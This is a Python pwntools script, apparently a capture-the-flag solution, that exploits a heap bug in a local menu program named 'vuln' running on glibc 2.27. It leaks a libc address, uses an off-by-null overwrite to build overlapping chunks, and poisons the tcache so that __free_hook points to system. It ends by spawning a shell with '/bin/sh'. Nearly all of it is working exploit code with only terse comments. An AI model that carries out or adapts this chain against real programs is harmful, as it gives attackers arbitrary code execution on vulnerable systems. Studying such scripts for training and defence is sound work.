from pwn import *

def add(idx, size):
    p.recvuntil(b'your choice: \n')
    p.sendline(b'1')
    p.recvuntil(b'Index: ')
    p.sendline(str(idx))
    p.recvuntil(b'Size: ')
    p.sendline(str(size))

def delete(idx):
    p.recvuntil(b'your choice: \n')
    p.sendline(b'2')
    p.recvuntil(b'Index: ')
    p.sendline(str(idx))

def edit(idx, size, content):
    p.recvuntil(b'your choice: \n')
    p.sendline(b'3')
    p.recvuntil(b'Index: ')
    p.sendline(str(idx))
    p.recvuntil(b'Size: ')
    p.sendline(str(size))
    p.recvuntil(b'Content: ')
    p.send(content)

def show(idx):
    p.recvuntil(b'your choice: \n')
    p.sendline(b'4')
    p.recvuntil(b'Index: ')
    p.sendline(str(idx))

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = process('./vuln')
elf = ELF('./vuln')
libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so')

for i in range(7):
    add(i, 0xf8)
add(7, 0xf8)
add(8, 0xf8)
add(9, 0x68)
add(10, 0xf8)
add(11, 0x18)

'''
fill tcache
'''
for i in range(7):
    delete(i)

'''
leak libc
'''
delete(7) #unsorted bin
for i in range(7):
    add(i, 0xf8)
add(20, 0x68) #get *fd
add(21, 0x80) #clean unsorted bin
show(20)
p.recvuntil(b'note 20: ')
libc_base = u64(p.recvline()[0:6] + b'\x00' * 0x2) - 0x3ebd90
print(hex(libc_base))
system = libc_base + libc.symbols['system']
free_hook = libc_base + libc.symbols['__free_hook']


'''
fill tcache
'''
for i in range(7):
    delete(i)

'''
exploit off-by-null to get overlapping chunk
'''
delete(8)
edit(9, 0x68, b'\x00' * 0x60 + p64(0x70 + 0x100))
delete(10)

'''
clean tcache
'''
for i in range(7):
    add(i, 0xf8)

add(12, 0xf8)
add(13, 0xf8) # same as note 9, overwrite #9 chunk size to 0x101
delete(9) # tcache -> #9
edit(13, 8, p64(free_hook)) # tcache -> #9 -> __free_hook
add(14, 0xf8)
add(15, 0xf8) #__free_hook
edit(15, 0x8, p64(system))
add(16, 0x10)
edit(16, 0x8, b'/bin/sh\x00')

delete(16) # system("bin/sh");
p.interactive()
